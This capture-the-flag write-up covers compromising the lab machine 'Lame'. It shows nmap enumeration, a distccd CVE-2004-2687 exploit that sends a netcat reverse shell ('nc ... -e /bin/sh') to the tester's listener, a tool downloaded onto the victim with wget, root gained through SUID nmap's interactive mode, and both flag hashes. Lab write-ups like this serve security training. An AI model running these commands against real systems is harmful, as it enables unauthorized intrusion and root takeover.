# Lame - Easy

## Enumeration
`sudo nmap 10.129.49.102 -p- -sV -vv -A --open --reason`

A few standard ports were open:
- 21 - FTP
```
| FTP server status:
|      Connected to 10.10.14.32
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
``````
- 22 - SSH 
```
OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
```
- 139/445 - NETBIOS
```
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  �           syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

```

One port of interest 
- 3632 - distccd

## Getting A Shell
Going through the FTP and NETBIOS further scans revealed nothing that could help.

The script for the `vsftpd` FTP server did not work even though it is the exploitable version.
(https://github.com/ahervias77/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py)

However, searching more about 3632 - distccd yielded more information. There is an nmap script that could scan for vulnerabilities for distccd:
```
nmap -p 3632 10.129.93.142 --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'" -Pn

Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 22:45 EDT
Nmap scan report for ip-10-129-93-142.ap-southeast-1.compute.internal (10.129.93.142)
Host is up (0.037s latency).

PORT     STATE SERVICE
3632/tcp open  distccd
| distcc-cve2004-2687: 
|   VULNERABLE:
|   distcc Daemon Command Execution
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2004-2687
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|       Allows executing of arbitrary commands on systems running distccd 3.1 and
|       earlier. The vulnerability is the consequence of weak service configuration.
|       
|     Disclosure date: 2002-02-01
|     Extra information:
|       
|     uid=1(daemon) gid=1(daemon) groups=1(daemon)
|   
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
|       https://distcc.github.io/security.html
|_      https://nvd.nist.gov/vuln/detail/CVE-2004-2687

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds

```

Found a script that could exploit it:
(https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)

Started a listener on my machine and sent the exploit command on victim:
```
python2 distccd_rce_CVE-2004-2687.py -t 10.129.93.142 -p 3632 -c "nc 10.10.14.4 4444 -e /bin/sh"
[OK] Connected to remote service

nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.4] from (UNKNOWN) [10.129.93.142] 58247

python -c 'import pty; pty.spawn("/bin/bash")'
daemon@lame:/tmp$
```

Obtaining the user flag was easy:
```
daemon@lame:/home/makis$ cat user.txt
cat user.txt
f7129c5573fe6328ded0a25f9db069a7
```

## Privilege Escalation
I found a python script that can search through SUIDs:
https://github.com/Anon-Exploiter/SUID3NUM

Hosted the file on my host machine and downloaded it into victim machine:
```
python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.129.93.142 - - [09/Oct/2023 23:01:21] "GET /suid3num.py HTTP/1.0" 200 -

daemon@lame:/tmp$ wget http://10.10.14.4:8888/suid3num.py
wget http://10.10.14.4:8888/suid3num.py
--23:01:48--  http://10.10.14.4:8888/suid3num.py
           => `suid3num.py'
Connecting to 10.10.14.4:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16,632 (16K) [text/x-python]

100%[====================================>] 16,632        13.64K/s             

23:01:49 (13.62 KB/s) - `suid3num.py' saved [16632/16632]
```

Running it yielded a result:
```
[#] SUID Binaries in GTFO bins list (Hell Yeah!)                                                        
------------------------------                                                                          
/usr/bin/nmap -~> https://gtfobins.github.io/gtfobins/nmap/#suid   
```
Getting root and root.txt was easy:
```
daemon@lame:/tmp$ nmap --interactive                                                                    
nmap --interactive                                                                                      
                                                                                                        
Starting Nmap V. 4.53 ( http://insecure.org )                                                           
Welcome to Interactive Mode -- press h <enter> for help                                                 
nmap> !sh                                                                                               
!sh                                                                                                     
sh-3.2# ls                                                                                              
ls                                                                                                      
5582.jsvc_up            distcc_eaebbc71.stderr  distccd_ea67bc71.o                                      
distcc_d081bc01.stdout  distccd_d0f8bc01.o      suid3num.py                                             
distcc_d148bc01.stderr  distccd_d0febc01.i      vgauthsvclog.txt.0                                      
distcc_ead3bc71.stdout  distccd_ea60bc71.i      vmware-root                                             
sh-3.2# cd /root                                                                                        
cd /root                                                                                                
sh-3.2# ls                                                                                              
ls                                                                                                      
Desktop  reset_logs.sh  root.txt  vnc.log                                                               
sh-3.2# cat root.txt                                                                                    
cat root.txt                                                                                            
0f0081518618299fe656be06b903e021
```

GG.